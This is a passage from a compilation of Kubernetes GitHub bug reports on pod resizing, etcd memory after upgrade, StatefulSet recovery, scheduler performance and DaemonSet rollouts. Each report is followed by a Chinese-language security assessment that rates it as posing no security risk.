Nov 12 10:15:53 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:53.062635   12114 status_manager.go:883] "Status for pod updated successfully" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" statusVersion=3 status={"phase":"Running","conditions":[{"type":"KruisePodReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"InPlaceUpdateReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"}],"hostIP":"172.21.154.57","hostIPs":[{"ip":"172.21.154.57"}],"podIP":"172.21.154.96","podIPs":[{"ip":"172.21.154.96"}],"startTime":"2024-11-12T02:15:50Z","containerStatuses":[{"name":"nginx","state":{"running":{"startedAt":"2024-11-12T02:15:50Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine","imageID":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128","containerID":"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb","started":true,"allocatedResources":{"cpu":"100m","memory":"100Mi"},"resources":{"limits":{"cpu":"1","memory":"1Gi"},"requests":{"cpu":"200m","memory":"200Mi"}}}],"qosClass":"Burstable","resize":"InProgress"}
```

// step 3

```
Nov 12 10:15:54 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:54.056885   12114 kuberuntime_manager.go:1051] "computePodActions got for pod" podActions="KillPod: false, CreateSandbox: false, UpdatePodResources: false, Attempt: 0, InitContainersToStart: [], ContainersToStart: [], EphemeralContainersToStart: [],ContainersToUpdate: map[], ContainersToKill: map[]" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn"
Nov 12 10:15:54 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:54.067151   12114 status_manager.go:874] "Patch status for pod" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" podUID="1cb463b9-8fbe-4d1f-a8ac-277d981684cd" patch="{\"metadata\":{\"uid\":\"1cb463b9-8fbe-4d1f-a8ac-277d981684cd\"},\"status\":{\"containerStatuses\":[{\"allocatedResources\":{\"cpu\":\"100m\",\"memory\":\"100Mi\"},\"containerID\":\"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb\",\"image\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine\",\"imageID\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128\",\"lastState\":{},\"name\":\"nginx\",\"ready\":true,\"resources\":{\"limits\":{\"cpu\":\"800m\",\"memory\":\"800Mi\"},\"requests\":{\"cpu\":\"100m\",\"memory\":\"100Mi\"}},\"restartCount\":0,\"started\":true,\"state\":{\"running\":{\"startedAt\":\"2024-11-12T02:15:50Z\"}}}],\"resize\":null}}"
Nov 12 10:15:54 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:54.067191   12114 status_manager.go:883] "Status for pod updated successfully" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" statusVersion=4 status={"phase":"Running","conditions":[{"type":"KruisePodReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"InPlaceUpdateReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"}],"hostIP":"172.21.154.57","hostIPs":[{"ip":"172.21.154.57"}],"podIP":"172.21.154.96","podIPs":[{"ip":"172.21.154.96"}],"startTime":"2024-11-12T02:15:50Z","containerStatuses":[{"name":"nginx","state":{"running":{"startedAt":"2024-11-12T02:15:50Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine","imageID":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128","containerID":"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb","started":true,"allocatedResources":{"cpu":"100m","memory":"100Mi"},"resources":{"limits":{"cpu":"800m","memory":"800Mi"},"requests":{"cpu":"100m","memory":"100Mi"}}}],"qosClass":"Burstable"}
```


// step 4
```
Nov 12 10:15:54 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:54.081966   12114 status_manager.go:874] "Patch status for pod" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" podUID="1cb463b9-8fbe-4d1f-a8ac-277d981684cd" patch="{\"metadata\":{\"uid\":\"1cb463b9-8fbe-4d1f-a8ac-277d981684cd\"},\"status\":{\"containerStatuses\":[{\"allocatedResources\":{\"cpu\":\"100m\",\"memory\":\"100Mi\"},\"containerID\":\"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb\",\"image\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine\",\"imageID\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128\",\"lastState\":{},\"name\":\"nginx\",\"ready\":true,\"resources\":{\"limits\":{\"cpu\":\"1\",\"memory\":\"1Gi\"},\"requests\":{\"cpu\":\"200m\",\"memory\":\"200Mi\"}},\"restartCount\":0,\"started\":true,\"state\":{\"running\":{\"startedAt\":\"2024-11-12T02:15:50Z\"}}}],\"resize\":\"InProgress\"}}"
Nov 12 10:15:54 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:54.081998   12114 status_manager.go:883] "Status for pod updated successfully" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" statusVersion=5 status={"phase":"Running","conditions":[{"type":"KruisePodReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"InPlaceUpdateReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"}],"hostIP":"172.21.154.57","hostIPs":[{"ip":"172.21.154.57"}],"podIP":"172.21.154.96","podIPs":[{"ip":"172.21.154.96"}],"startTime":"2024-11-12T02:15:50Z","containerStatuses":[{"name":"nginx","state":{"running":{"startedAt":"2024-11-12T02:15:50Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine","imageID":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128","containerID":"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb","started":true,"allocatedResources":{"cpu":"100m","memory":"100Mi"},"resources":{"limits":{"cpu":"1","memory":"1Gi"},"requests":{"cpu":"200m","memory":"200Mi"}}}],"qosClass":"Burstable","resize":"InProgress"}
```


// step5
```
Nov 12 10:15:55 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:55.052256   12114 kuberuntime_manager.go:1051] "computePodActions got for pod" podActions="KillPod: false, CreateSandbox: false, UpdatePodResources: false, Attempt: 0, InitContainersToStart: [], ContainersToStart: [], EphemeralContainersToStart: [],ContainersToUpdate: map[], ContainersToKill: map[]" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn"
Nov 12 10:15:55 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:55.067675   12114 status_manager.go:874] "Patch status for pod" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" podUID="1cb463b9-8fbe-4d1f-a8ac-277d981684cd" patch="{\"metadata\":{\"uid\":\"1cb463b9-8fbe-4d1f-a8ac-277d981684cd\"},\"status\":{\"containerStatuses\":[{\"allocatedResources\":{\"cpu\":\"100m\",\"memory\":\"100Mi\"},\"containerID\":\"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb\",\"image\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine\",\"imageID\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128\",\"lastState\":{},\"name\":\"nginx\",\"ready\":true,\"resources\":{\"limits\":{\"cpu\":\"800m\",\"memory\":\"800Mi\"},\"requests\":{\"cpu\":\"100m\",\"memory\":\"100Mi\"}},\"restartCount\":0,\"started\":true,\"state\":{\"running\":{\"startedAt\":\"2024-11-12T02:15:50Z\"}}}],\"resize\":null}}"
Nov 12 10:15:55 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:55.067746   12114 status_manager.go:883] "Status for pod updated successfully" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" statusVersion=6 status={"phase":"Running","conditions":[{"type":"KruisePodReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"InPlaceUpdateReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"}],"hostIP":"172.21.154.57","hostIPs":[{"ip":"172.21.154.57"}],"podIP":"172.21.154.96","podIPs":[{"ip":"172.21.154.96"}],"startTime":"2024-11-12T02:15:50Z","containerStatuses":[{"name":"nginx","state":{"running":{"startedAt":"2024-11-12T02:15:50Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine","imageID":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128","containerID":"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb","started":true,"allocatedResources":{"cpu":"100m","memory":"100Mi"},"resources":{"limits":{"cpu":"800m","memory":"800Mi"},"requests":{"cpu":"100m","memory":"100Mi"}}}],"qosClass":"Burstable"}
```

#### How can we reproduce it (as minimally and precisely as possible)?

I am unable to identify a consistent method to reproduce this issue.
This is an intermittent case.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在启用InPlacePodVerticalScaling的集群中，kubelet有时会错误地设置`.status.resize`字段，导致Pod的状态出现异常。这种现象在减少CPU请求量时发生，具体表现为`.status.resize`字段在不应出现的情况下被设置为`InProgress`，并且`.status.containerStatuses[x].resources`的值反复变化。

根据提供的信息，这是一个偶发的bug，导致Pod的状态更新不正确。但从当前的描述来看，这更像是kubelet在处理Pod垂直扩缩容过程中的逻辑错误或状态同步问题，并未涉及安全风险。

根据风险判断标准：

1. **该风险能被攻击者利用**：从描述来看，没有迹象表明攻击者可以利用该问题进行攻击，导致权限提升、数据泄露、远程代码执行等安全问题。

2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：此问题属于功能性缺陷，可能会影响系统的可靠性或可用性，但不太可能被认定为安全漏洞，因此不太可能被分配CVE编号。

综上所述，该Issue不涉及安全风险，风险评级为“不涉及”。

---

## Issue #128986 Dueling writes to extension-apiserver-authentication configmap during 1.31 → 1.32.0-rc.1 upgrade

- Issue 链接：[#128986](https://github.com/kubernetes/kubernetes/issues/128986)

### Issue 内容

#### What happened?

We had an alert firing for high memory usage for 1.32. At the time of increase we changed the churn to create at v1.31 (So update to v1.32). Previously it was creating at v1.30 and updating to v1.31

We can see some etcd are using more memory than others
```
kubx-etcd-02          etcd-csprq8020q6fal7635s0-6zxcz72w5v                         24m          420Mi           
kubx-etcd-02          etcd-csprq8020q6fal7635s0-hm5px7dkc5                         19m          416Mi           
kubx-etcd-02          etcd-csprq8020q6fal7635s0-jhmsq75wc5                         60m          566Mi  

...

kubx-etcd-04          etcd-cssndj620tea3foqjl5g-5qqscgqp2g                         28m          101Mi           
kubx-etcd-04          etcd-cssndj620tea3foqjl5g-c45kz2lprz                         23m          117Mi           
kubx-etcd-04          etcd-cssndj620tea3foqjl5g-wsbwcb9fp8                         50m          103Mi 
```

#### What did you expect to happen?

When a cluster updating to 1.32 from 1.31, we expected (roughly) th same etcd memory usage as 1.31

#### How can we reproduce it (as minimally and precisely as possible)?

- Deploy a 1.31 cluster
- upgrade to 1.32
- Observer memory usage on etcd

#### Anything else we need to know?

A cluster that was created at v1.32 has an etcd `container_memory_working_set_bytes` of around 130 MB.
A v1.31 cluster is also around 130 MB. After the upgrade to v1.32 it increased to around 450 MB (Caused by a short increase in etcd_mvcc_db_total_size_in_use_in_bytes to 430 MB). `etcd_mvcc_db_total_size_in_bytes` permanently increased to 450 MB at upgrade time too. Over time some of the etcds saw an increase in `container_memory_working_set_bytes` to 600MB, but `etcd_mvcc_db_total_size_in_bytes` did not change.

When it was defragged the `etcd_mvcc_db_total_size_in_bytes` dropped to 11 MB (Which is just above the value of `etcd_mvcc_db_total_size_in_use_in_bytes` but `container_memory_working_set_bytes` only dropped to around 450MB.

After further investigation it requires a defrag, followed by restart of etcd pods to return the memory usage to normal after an update to v1.32.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.32.0-beta.0+IKS
```

</details>


#### Cloud provider

<details>
IBM Cloud
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.1 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo

$ uname -a
Linux test-csug3jq20lvmbeb4nq2g-standard132-default-00000172 6.8.0-48-generic #48-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep 27 14:04:52 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，该问题描述的是在Kubernetes从v1.31升级到v1.32时，etcd的内存使用量显著增加，需要通过defrag（碎片整理）和重启etcd pod来恢复正常内存使用。这似乎是升级过程中导致etcd数据增大，产生碎片，从而引起内存占用增加的性能问题。

在Issue中，没有提及任何攻击者可以利用的安全漏洞，也没有涉及权限提升、命令执行或对其他用户的影响等安全风险。根据风险判断标准，此问题属于性能优化或升级过程中的问题，不涉及安全风险。

---

## Issue #128977 [InPlacePodVerticalScaling]stuck in InProgress when patch resources in a special pod

- Issue 链接：[#128977](https://github.com/kubernetes/kubernetes/issues/128977)

### Issue 内容

#### What happened?

In clusters with InPlacePodVerticalScaling enabled, if a pod without resource limits undergoes a resource patch change, its status will perpetually remain 'InProgress'. The kubelet log contains an error message: 'E1125 17:05:47.633962 12114 kuberuntime_manager.go:750] "podResources.CPUQuota or podResources.CPUShares is nil" pod="clone3-h6r9k"'.

#### What did you expect to happen?

I hope this case can be closed-loop, and it can be achieved in any of the following ways:

1. Rejected by the api-server.
2. The proposal is rejected by Kubelet and displayed in `.status.resize`.
3. Able to be properly resized.

#### How can we reproduce it (as minimally and precisely as possible)?

```yaml pod.yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    owner: clone
  name: clone-test
spec:
  containers:
  - env:
    - name: test
      value: foo
    image: registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine
    imagePullPolicy: IfNotPresent
    name: nginx
    resizePolicy:
    - resourceName: cpu
      restartPolicy: NotRequired
    - resourceName: memory
      restartPolicy: NotRequired
    resources:
      limits:
        memory: 1Gi
      requests:
        cpu: 100m
        memory: 100Mi
  dnsPolicy: ClusterFirst
  terminationGracePeriodSeconds: 30
```
1. create pod
```bash
kubectl apply -f pod.yaml
```
2. wait pod ready
3. patch pod

```bash
kubectl patch po clone-test --type='json' -p='[{"op": "replace", "path": "/spec/containers/0/resources/requests/cpu", "value": "200m"}]'
```


4. You will encounter an error log like `podResources.CPUQuota or podResources.CPUShares is nil` in the Kubelet logs, and as a result, the pod will remain stuck in the 'InProgress' state.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在启用了InPlacePodVerticalScaling的集群中，如果一个没有设置资源限制（limits）的Pod进行资源修改（patch）操作，其状态会一直卡在“InProgress”状态，且Kubelet日志中会出现错误信息。这个问题本质上是一个功能性缺陷或Bug，导致Pod无法正确完成资源调整。根据风险判断标准，攻击者无法利用此缺陷进行攻击或获取更高权限，也无法导致拒绝服务（DoS）攻击，因为需要有权限对Pod进行资源修改操作才会触发该问题。而这种权限通常仅限于有合法访问权限的用户。综上所述，该问题不涉及安全风险。

---

## Issue #128970 statefulset can not recreate the lost replicas in case of node loss

- Issue 链接：[#128970](https://github.com/kubernetes/kubernetes/issues/128970)

### Issue 内容

#### What happened?

kube-state-metric  was deployed with statefulset, in multiple shard  mode

shard 1-3 are lost during a disaster, but they never get recreated
![image](https://github.com/user-attachments/assets/55974f88-54b3-46f5-a42f-fa14889f422a)


#### What did you expect to happen?

the lost replicas should be recreated automatically

#### How can we reproduce it (as minimally and precisely as possible)?

create a kind cluster with multiple nodes
create a statefulset with replicas spread over these nodes
delete one or more nodes and check

#### Anything else we need to know?
I'am not sure if it's designed by purpose or a known issue waiting for fix

#### Kubernetes version

happened on 1.20.7
assumed it still exists in lastest release

#### Cloud provider

not specific to  any cloud provider

#### OS version

not specific to any OS version

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在节点丢失的情况下，StatefulSet无法重新创建丢失的副本的问题。这属于StatefulSet在灾难恢复情况下的行为异常，可能影响应用的高可用性和可靠性。然而，按照风险判断标准，这个问题并不存在被攻击者利用的安全风险，也不属于可能被分配CVE编号的漏洞。它不涉及攻击者的恶意行为，也不涉及权限提升、命令执行等高风险安全问题。因此，该Issue不涉及安全风险。

---

## Issue #128949 scheduler plugin podTopologySpread performs not well enough in a disaster recovery scenario

- Issue 链接：[#128949](https://github.com/kubernetes/kubernetes/issues/128949)

### Issue 内容

#### What happened?

I ran a disaster recovery scenario with 2000 kwok fake nodes, 100,000 pending pods recently.

Each pod has topologySpreadConstraints specified as below
`
                "topologySpreadConstraints": [
                    {
                        "labelSelector": {
                            "matchLabels": {
                                "app": "fake-pod"
                            }
                        },
                        "maxSkew": 1,
                        "topologyKey": "topology.kubernetes.io/region", 
                        "whenUnsatisfiable": "ScheduleAnyway"
                    },
                    {
                        "labelSelector": {
                            "matchLabels": {
                                "app": "fake-pod"
                            }
                        },
                        "maxSkew": 1,
                        "topologyKey": "kubernetes.io/hostname",
                        "whenUnsatisfiable": "ScheduleAnyway"
                    }
                ]
`

The overall performance of kube-scheduler degrades as the number of pods on each node increases.
![scheduler_attempts](https://github.com/user-attachments/assets/236aa4f0-2534-40af-8780-a40bd5f5a377)

As I digged further with pprof ,  the most time-consuming process was found in podTopologySpead, within the PreScore stage, in below 2 functions:
- countPodsMatchSelector  
- PodMatchesNodeSelectorAndAffinityTerms
![scheduler_pprof](https://github.com/user-attachments/assets/00d57008-172c-4469-b39e-bc3e4983144a)



 


#### What did you expect to happen?

rate(scheduler_schedule_attempts_total[1m]) should keep steady during the test run

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a cluster with 2000 nodes, stop kube-scheduler first
2. Create a deployment with 100,000 replicas,  topologySpreadConstraints described as above
3. Start kube-scheduler and watch the deployment status and kube-scheduler metrics, until all pods are scheduled

#### Anything else we need to know?

countPodsMatchSelector is also called in Score stage. It can be a good starting point to boost overall performance.

In most scenarios, pod has an owner (rs/dp/ds/sts etc),  and topologySpread is applied to all pods with the same owner.

So based on the above theory, this can be optimized to an O(1) procedure, after we apply some tricks on it:

- add a cache (map[UID][]*PodInfo) in nodeInfo, indexed by the pod's owner Id
- the cache will be updated with the Add/Update/Del callback of pod informer
- in countPodsMatchSelector
   * If the pod has an owner, we use owner's Id to find the pre-aggregated count.
   * If it doesn't, fallback to the old ways.

Any comments are welcomed. 

If this is feasible without defects, I can try to create a PR for this. 

The improvement can be (in a same test baseline):
- 100,000 pod scheduled total time:  drops from 7min30s to 4min
- rate(scheduler_schedule_attempts_total[1m]) keeps steady above 420 compared to an avg of 220
![image](https://github.com/user-attachments/assets/3eaf43d5-6bc8-47d5-8603-dab22dc65689)




#### Kubernetes version

1.20.7 but also applies to the lastest release

#### Cloud provider

not specific to any cloud provider

#### OS version

not specific to any os version

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述的是在灾难恢复场景中，使用podTopologySpread调度插件时，性能不够理想的问题。具体来说，当有大量（100,000个）待调度的Pod时，kube-scheduler的整体性能下降，主要耗时集中在PreScore阶段的`countPodsMatchSelector`和`PodMatchesNodeSelectorAndAffinityTerms`函数。Issue提交者提出了一种优化方案，即通过在nodeInfo中添加一个以Pod所属的控制器（如ReplicaSet、Deployment等）为键的缓存来提升性能。

经过分析，此Issue涉及的是调度器性能优化问题，并未提及任何安全漏洞或潜在安全风险。优化过程中涉及到的缓存机制，如果设计和实现得当，不会引入安全问题。没有迹象表明该优化方案会导致权限提升、命令执行、容器逃逸、数据泄露等安全风险。

因此，根据风险判断标准，此Issue不涉及安全风险。

---

## Issue #128917 [FG:InPlacePodVerticalScaling] Remove ResizePolicy defaulting

- Issue 链接：[#128917](https://github.com/kubernetes/kubernetes/issues/128917)

### Issue 内容

/kind bug

Prior to Kubernetes v1.31, any defaulted change to the pod API could trigger running pods to restart on apiserver upgrade (fixed by https://github.com/kubernetes/kubernetes/pull/124220). Since v1.30 is still within the valid version we cannot set a default ResizePolicy.

Kubelet already handles an unset ResizePolicy as an implicit default (`NotRequired`), so all that is needed here is to remove the defaulting logic. This is probably the preferred behavior even without the version skew issue.

/sig node
/milestone v1.33
/priority important-soon
/triage accepted

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该 Issue 内容涉及 Kubernetes 项目中关于 `ResizePolicy` 默认值处理的一个 Bug 修复。具体来说，在 Kubernetes v1.31 之前，如果对 Pod API 进行了任何默认值的更改，可能会在 apiserver 升级时触发正在运行的 Pod 重启（这个问题已在 PR https://github.com/kubernetes/kubernetes/pull/124220 中修复）。由于 v1.30 版本仍在使用中，因此建议不要为 `ResizePolicy` 设置默认值，而是让 kubelet 处理未设置的 `ResizePolicy`，将其视为默认值 `NotRequired`。

从安全角度来看，这个问题与集群升级过程中的行为有关，可能导致 Pod 重启。然而，这需要集群管理员在升级 apiserver 时触发，普通攻击者无法利用此行为来实施攻击，也不存在利用此漏洞进行未授权操作、权限提升、敏感信息泄露等安全风险。

根据风险判断标准：
1. 该风险不能被普通攻击者利用。
2. 该风险不可能成为一个高危漏洞，不会被分配 CVE 编号，按照 CVSS 3.1 标准评分不在 High 以上。
4. 即使认为是拒绝服务（DoS）风险，攻击者也需要管理员权限才能实施，按照标准应降低风险评级。

因此，此 Issue 不涉及安全风险。

---

## Issue #128908 daemonset rolling update stuck

- Issue 链接：[#128908](https://github.com/kubernetes/kubernetes/issues/128908)

### Issue 内容

#### What happened?

![image](https://github.com/user-attachments/assets/025f7c96-c30f-4db3-b461-873dda86f680)
![image](https://github.com/user-attachments/assets/b6782f9c-62de-4c1c-816f-3459e7eef1ca)

I found that daemonset was stuck during the rolling upgrade, and one pod was not updated.
Or the numberUnavailable calculation result of daemonset is incorrect.

In addition, when deleting abnormal pods, daemonset does not delete all pods at a time. Instead, it deletes one pod every several minutes. The log is as follows:
I1121 13:08:27.938981      10 daemon_controller.go:849] "Found failed daemon pod on node, will try to kill it" pod="nce-omp/hofsfusedeviceplugin-d9p2d" node="caasnode1"
I1121 13:08:27.939171      10 controller_utils.go:609] "Deleting pod" controller="hofsfusedeviceplugin" pod="nce-omp/hofsfusedeviceplugin-d9p2d"
I1121 13:08:27.939480      10 event.go:307] "Event occurred" object="nce-omp/hofsfusedeviceplugin" fieldPath="" kind="DaemonSet" apiVersion="apps/v1" type="Warning" reason="FailedDaemonPod" message="Found failed daemon pod nce-omp/hofsfusedeviceplugin-d9p2d on node caasnode1, will try to kill it"
I1121 13:08:27.953742      10 event.go:307] "Event occurred" object="nce-omp/hofsfusedeviceplugin" fieldPath="" kind="DaemonSet" apiVersion="apps/v1" type="Normal" reason="SuccessfulDelete" message="Deleted pod: hofsfusedeviceplugin-d9p2d"
I1121 13:23:27.940867      10 daemon_controller.go:849] "Found failed daemon pod on node, will try to kill it" pod="nce-omp/hofsfusedeviceplugin-85zzt" node="caasnode1"
I1121 13:23:27.941014      10 controller_utils.go:609] "Deleting pod" controller="hofsfusedeviceplugin" pod="nce-omp/hofsfusedeviceplugin-85zzt"
I1121 13:23:27.941335      10 event.go:307] "Event occurred" object="nce-omp/hofsfusedeviceplugin" fieldPath="" kind="DaemonSet" apiVersion="apps/v1" type="Warning" reason="FailedDaemonPod" message="Found failed daemon pod nce-omp/hofsfusedeviceplugin-85zzt on node caasnode1, will try to kill it"
I1121 13:23:27.953140      10 event.go:307] "Event occurred" object="nce-omp/hofsfusedeviceplugin" fieldPath="" kind="DaemonSet" apiVersion="apps/v1" type="Normal" reason="SuccessfulDelete" message="Deleted pod: hofsfusedeviceplugin-85zzt"

#### What did you expect to happen?

The daemonset should roll the upgrade correctly.

#### How can we reproduce it (as minimally and precisely as possible)?

N/A

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.30
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


